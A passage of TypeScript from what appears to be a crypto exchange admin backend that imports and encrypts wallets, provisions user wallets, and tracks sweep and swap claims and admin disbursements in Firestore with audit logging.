    tier: params.tier,
    label: params.label.trim().slice(0, 100),
    networkFamily: params.networkFamily,
    quorum: params.quorum.slice(0, 32),
    allocationCapPct: Math.max(0, Math.min(100, params.allocationCapPct)),
    status: 'active',
    createdBy: sanitizeId(params.actorUid),
    createdAt: serverTimestamp(),
    updatedAt: serverTimestamp(),
  };

  if (params.importMethod === 'mnemonic') {
    if (!params.custodyPassphrase || params.custodyPassphrase.length < 6) {
      throw new Error('Custody passphrase (min 6 chars) required to encrypt seed phrase.');
    }
    const derived = deriveWalletFromMnemonic(params.inputSecretOrAddress.trim(), {
      preset: params.tier === 'cold' ? 'ledger' : 'standard',
      accountIndex: 0,
    });
    payload.encryptedVaultBlob = (
      await encryptPayload(derived.secrets, params.custodyPassphrase)
    ).slice(0, 4096);
    if (derived.addresses.evmAddress) payload.evmAddress = derived.addresses.evmAddress;
    if (derived.addresses.solanaAddress) payload.solanaAddress = derived.addresses.solanaAddress;
    if (derived.addresses.bitcoinAddress) payload.bitcoinAddress = derived.addresses.bitcoinAddress;
    if (derived.addresses.moneroAddress) payload.moneroAddress = derived.addresses.moneroAddress;
  } else if (params.importMethod === 'privateKey') {
    if (!params.custodyPassphrase || params.custodyPassphrase.length < 6) {
      throw new Error('Custody passphrase (min 6 chars) required to encrypt private key.');
    }
    const derived = deriveWalletFromPrivateKey(params.inputSecretOrAddress.trim(), 'auto');
    payload.encryptedVaultBlob = (
      await encryptPayload(derived.secrets, params.custodyPassphrase)
    ).slice(0, 4096);
    if (derived.addresses.evmAddress) payload.evmAddress = derived.addresses.evmAddress;
    if (derived.addresses.solanaAddress) payload.solanaAddress = derived.addresses.solanaAddress;
    if (derived.addresses.bitcoinAddress) payload.bitcoinAddress = derived.addresses.bitcoinAddress;
    if (derived.addresses.moneroAddress) payload.moneroAddress = derived.addresses.moneroAddress;
  } else {
    const raw = params.inputSecretOrAddress.trim();
    if (raw.startsWith('0x') && raw.length >= 42) {
      payload.evmAddress = raw.slice(0, 100);
    } else if (raw.startsWith('bc1') || raw.startsWith('1') || raw.startsWith('3')) {
      payload.bitcoinAddress = raw.slice(0, 100);
    } else if ((raw.startsWith('4') || raw.startsWith('8')) && raw.length >= 95) {
      payload.moneroAddress = raw.slice(0, 120);
    } else {
      payload.solanaAddress = raw.slice(0, 100);
    }
  }

  try {
    await setDoc(doc(db, 'exchange_wallets', id), payload);
    await appendAdminAuditLog(
      params.actorUid,
      `EXCHANGE_${params.tier.toUpperCase()}_WALLET_ADDED`,
      id,
      `Admin added ${params.tier.toUpperCase()} wallet "${params.label}" (${params.importMethod})`
    );
  } catch (err) {
    handleFirestoreError(err, OperationType.CREATE, path);
  }

  return {
    id,
    tier: params.tier,
    label: params.label.trim(),
    networkFamily: params.networkFamily,
    evmAddress: payload.evmAddress as string | undefined,
    solanaAddress: payload.solanaAddress as string | undefined,
    bitcoinAddress: payload.bitcoinAddress as string | undefined,
    moneroAddress: payload.moneroAddress as string | undefined,
    quorum: params.quorum,
    allocationCapPct: params.allocationCapPct,
    status: 'active',
    encryptedVaultBlob: payload.encryptedVaultBlob as string | undefined,
    createdBy: params.actorUid,
    createdAt: Date.now(),
    updatedAt: Date.now(),
  };
}

export async function listUserWalletsForAdmin(targetUid: string): Promise<WalletAccount[]> {
  return fetchUserWalletsFromCloud(targetUid);
}

export async function adminProvisionWalletForUser(params: {
  targetUid: string;
  walletName: string;
  mode: 'generate' | 'watchAddress';
  watchAddress?: string;
  encryptPassword?: string;
  actorUid: string;
}): Promise<{ wallet: WalletAccount; generatedMnemonic?: string }> {
  const walletId = sanitizeId(`adm_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`);
  const path = `users/${params.targetUid}/wallets/${walletId}`;

  let wallet: WalletAccount;
  let generatedMnemonic: string | undefined;

  if (params.mode === 'generate') {
    const words = generateMnemonicWords(12);
    generatedMnemonic = words.join(' ');
    const derived = deriveWalletFromMnemonic(generatedMnemonic, {
      preset: 'standard',
      accountIndex: 0,
    });
    const encryptedSecret = params.encryptPassword
      ? await encryptPayload(derived.secrets, params.encryptPassword)
      : undefined;
    wallet = {
      id: walletId,
      name: params.walletName.trim() || 'Admin Provisioned Vault',
      type: 'mnemonic',
      wordCount: 12,
      preset: 'standard',
      accountIndex: 0,
      addresses: derived.addresses,
      encryptedSecret,
      createdAt: Date.now(),
    };
  } else {
    const addr = (params.watchAddress || '').trim();
    if (!addr) throw new Error('Enter a valid public EVM, Solana, Bitcoin, or Monero address.');
    wallet = {
      id: walletId,
      name: params.walletName.trim() || 'Admin Assigned Watch Wallet',
      type: 'watchOnly',
      accountIndex: 0,
      addresses: {
        evmAddress: addr.startsWith('0x') ? addr : '',
        evmPath: 'Admin-Assigned',
        solanaAddress:
          !addr.startsWith('0x') &&
          !addr.startsWith('bc1') &&
          !(addr.startsWith('4') || addr.startsWith('8'))
            ? addr
            : '',
        solanaPath: 'Admin-Assigned',
        bitcoinAddress: addr.startsWith('bc1') || addr.startsWith('1') || addr.startsWith('3') ? addr : '',
        bitcoinPath: 'Admin-Assigned',
        moneroAddress: (addr.startsWith('4') || addr.startsWith('8')) && addr.length >= 95 ? addr : '',
        moneroPath: 'Admin-Assigned',
      },
      createdAt: Date.now(),
    };
  }

  try {
    const payload: Record<string, unknown> = {
      id: walletId,
      ownerUid: params.targetUid,
      name: wallet.name.slice(0, 80),
      walletType: wallet.type,
      accountIndex: 0,
      createdAt: serverTimestamp(),
      updatedAt: serverTimestamp(),
    };
    if (wallet.wordCount) payload.wordCount = wallet.wordCount;
    if (wallet.preset) payload.preset = wallet.preset;
    if (wallet.addresses.evmAddress) payload.evmAddress = wallet.addresses.evmAddress.slice(0, 100);
    if (wallet.addresses.solanaAddress) payload.solanaAddress = wallet.addresses.solanaAddress.slice(0, 100);
    if (wallet.addresses.bitcoinAddress) payload.bitcoinAddress = wallet.addresses.bitcoinAddress.slice(0, 100);
    if (wallet.addresses.moneroAddress) payload.moneroAddress = wallet.addresses.moneroAddress.slice(0, 120);
    if (wallet.encryptedSecret) payload.encryptedSecret = wallet.encryptedSecret.slice(0, 4096);

    await setDoc(doc(db, 'users', params.targetUid, 'wallets', walletId), payload);

    const userSnap = await getDoc(doc(db, 'users', params.targetUid));
    if (userSnap.exists()) {
      const currCount = Number(userSnap.data().walletCount ?? 0);
      await updateDoc(doc(db, 'users', params.targetUid), {
        walletCount: Math.min(1000, currCount + 1),
        updatedAt: serverTimestamp(),
      });
    }

    await appendAdminAuditLog(
      params.actorUid,
      'ADMIN_USER_WALLET_ADDED',
      params.targetUid,
      `Provisioned "${wallet.name}" (${wallet.type}) to user ${params.targetUid}`
    );
  } catch (err) {
    handleFirestoreError(err, OperationType.CREATE, path);
  }

  return { wallet, generatedMnemonic };
}

// ============================================================================
// SWEEP & SWAP CLAIMS AND ADMIN DISBURSEMENTS
// ============================================================================

function mapClaimDoc(d: Record<string, unknown>): ClaimRequestRecord {
  return {
    id: String(d.id || ''),
    ownerUid: typeof d.ownerUid === 'string' ? d.ownerUid : undefined,
    sourceType: d.sourceType === 'swap' ? 'swap' : 'sweep',
    walletAddress: String(d.walletAddress || ''),
    destinationAddress: String(d.destinationAddress || ''),
    networkId: String(d.networkId || 'ethereum') as NetworkId,
    symbol: String(d.symbol || ''),
    amount: String(d.amount || '0'),
    usdValue: Number(d.usdValue ?? 0),
    sourceTxHash: String(d.sourceTxHash || ''),
    status: (['claimable', 'requested', 'disbursed', 'rejected'].includes(String(d.status))
      ? String(d.status)
      : 'claimable') as ClaimStatus,
    disbursedByWalletId:
      typeof d.disbursedByWalletId === 'string' ? d.disbursedByWalletId : undefined,
    disbursedByWalletLabel:
      typeof d.disbursedByWalletLabel === 'string' ? d.disbursedByWalletLabel : undefined,
    disbursementTxHash:
      typeof d.disbursementTxHash === 'string' ? d.disbursementTxHash : undefined,
    note: typeof d.note === 'string' ? d.note : undefined,
    createdAt: toMillis(d.createdAt),
    requestedAt: d.requestedAt ? toMillis(d.requestedAt) : undefined,
    disbursedAt: d.disbursedAt ? toMillis(d.disbursedAt) : undefined,
    updatedAt: toMillis(d.updatedAt),
  };
}

export async function listClaimRequestsForUser(uid: string): Promise<ClaimRequestRecord[]> {
  const path = 'claim_requests';
  try {
    const q = query(collection(db, 'claim_requests'), where('ownerUid', '==', uid));
    const snap = await getDocs(q);
    return snap.docs
      .map((docSnap) => mapClaimDoc(docSnap.data()))
      .sort((a, b) => b.updatedAt - a.updatedAt);
  } catch (err) {
    handleFirestoreError(err, OperationType.LIST, path);
  }
}

export async function listAllClaimRequestsForAdmin(): Promise<ClaimRequestRecord[]> {
  const path = 'claim_requests';
  try {
    const snap = await getDocs(collection(db, 'claim_requests'));
    return snap.docs
      .map((docSnap) => mapClaimDoc(docSnap.data()))
      .sort((a, b) => b.updatedAt - a.updatedAt);
  } catch (err) {
    handleFirestoreError(err, OperationType.LIST, path);
  }
}

export async function upsertClaimRequestInCloud(
  claim: ClaimRequestRecord,
  uid: string
): Promise<void> {
  const safeId = sanitizeId(claim.id);
  const path = `claim_requests/${safeId}`;
  try {
    const ref = doc(db, 'claim_requests', safeId);
    const snap = await getDoc(ref);
    if (snap.exists()) {
      const existingData = snap.data();
      if (
        existingData.status !== 'disbursed' &&
        existingData.status !== 'rejected' &&
        claim.status === 'requested'
      ) {
        const updatePayload: Record<string, unknown> = {
          status: 'requested',
          destinationAddress: (claim.destinationAddress || existingData.destinationAddress).slice(0, 140),
          requestedAt: serverTimestamp(),
          updatedAt: serverTimestamp(),
        };
        if (claim.note?.trim()) updatePayload.note = claim.note.trim().slice(0, 300);
        await updateDoc(ref, updatePayload);
      }
      return;
    }

    const safeStatus = claim.status === 'requested' ? 'requested' : 'claimable';
    const payload: Record<string, unknown> = {
      id: safeId,
      ownerUid: sanitizeId(uid),
      sourceType: claim.sourceType,
      walletAddress: (claim.walletAddress || 'unknown').slice(0, 140),
      destinationAddress: (claim.destinationAddress || claim.walletAddress || 'unknown').slice(0, 140),
      networkId: String(claim.networkId || 'ethereum').slice(0, 32),
      symbol: (claim.symbol || 'ETH').slice(0, 40),
      amount: (claim.amount || '0').slice(0, 100),
      usdValue: Math.max(0, Math.min(100_000_000_000, Number(claim.usdValue || 0))),
      sourceTxHash: (claim.sourceTxHash || safeId).slice(0, 200),
      status: safeStatus,
      createdAt: serverTimestamp(),
      updatedAt: serverTimestamp(),
    };
    if (safeStatus === 'requested') {
      payload.requestedAt = serverTimestamp();
    }
    if (claim.note?.trim()) {
      payload.note = claim.note.trim().slice(0, 300);
    }

    await setDoc(ref, payload);
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, path);
  }
}

export async function requestClaimInCloud(
  claim: ClaimRequestRecord,
  uid: string,
  destinationAddress?: string,
  note?: string
): Promise<void> {
  const safeId = sanitizeId(claim.id);
  const path = `claim_requests/${safeId}`;
  try {
    const ref = doc(db, 'claim_requests', safeId);
    const snap = await getDoc(ref);
    const nextDest = (destinationAddress?.trim() || claim.destinationAddress || claim.walletAddress).slice(0, 140);
    if (!snap.exists()) {
      await upsertClaimRequestInCloud(
        {
          ...claim,
          destinationAddress: nextDest,
          note: note?.trim() || claim.note,
          status: 'requested',
        },
        uid
      );
      return;
    }
    const existingData = snap.data();
    if (existingData.status === 'disbursed' || existingData.status === 'rejected') return;

    const updatePayload: Record<string, unknown> = {
      status: 'requested',
      destinationAddress: nextDest,
      requestedAt: serverTimestamp(),
      updatedAt: serverTimestamp(),
    };
    if (note?.trim()) updatePayload.note = note.trim().slice(0, 300);
    await updateDoc(ref, updatePayload);
  } catch (err) {
    handleFirestoreError(err, OperationType.UPDATE, path);
  }
}

export async function adminDisburseClaimInCloud(params: {
  claim: ClaimRequestRecord;
  status: 'disbursed' | 'rejected';
  disbursedByWalletId?: string;
  disbursedByWalletLabel?: string;
  disbursementTxHash?: string;
  note?: string;
  actorUid: string;
}): Promise<void> {
  const safeId = sanitizeId(params.claim.id);
  const path = `claim_requests/${safeId}`;
  try {
    const ref = doc(db, 'claim_requests', safeId);
    const snap = await getDoc(ref);
    if (snap.exists()) {
      const updatePayload: Record<string, unknown> = {
        status: params.status,
        updatedAt: serverTimestamp(),
      };
      if (params.disbursedByWalletId) {
        updatePayload.disbursedByWalletId = params.disbursedByWalletId.slice(0, 128);
      }
      if (params.disbursedByWalletLabel) {
        updatePayload.disbursedByWalletLabel = params.disbursedByWalletLabel.slice(0, 100);
      }
      if (params.disbursementTxHash) {
        updatePayload.disbursementTxHash = params.disbursementTxHash.slice(0, 200);
      }
      if (params.note?.trim()) {
        updatePayload.note = params.note.trim().slice(0, 300);
      }
      if (params.status === 'disbursed') {
        updatePayload.disbursedAt = serverTimestamp();
      }
      await updateDoc(ref, updatePayload);
    }

    await appendAdminAuditLog(
      params.actorUid,
      params.status === 'disbursed' ? 'CLAIM_DISBURSED' : 'CLAIM_REJECTED',
      safeId,
      `${params.status === 'disbursed' ? 'Disbursed' : 'Rejected'} ${params.claim.sourceType.toUpperCase()} claim ${
        params.claim.amount
      } ${params.claim.symbol} for ${params.claim.walletAddress.slice(0, 14)}...${
        params.disbursedByWalletLabel ? ` via ${params.disbursedByWalletLabel}` : ''
      }`
    );
  } catch (err) {
    handleFirestoreError(err, OperationType.UPDATE, path);
  }
}


